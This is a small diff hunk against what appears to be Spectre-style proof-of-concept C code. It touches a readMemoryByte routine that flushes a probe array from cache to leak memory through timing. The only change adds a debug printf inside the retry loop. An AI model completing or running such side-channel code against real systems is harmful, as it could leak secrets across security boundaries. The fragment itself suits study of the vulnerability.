@@ -66,7 +66,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
   for (i = 0; i < 256; i++)
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
-      
+      printf("try %d", i);
     results[0] = 0;
     /* Flush big array[4096*(0..255)] from cache */
     for (i = 0; i < 4096; i++)
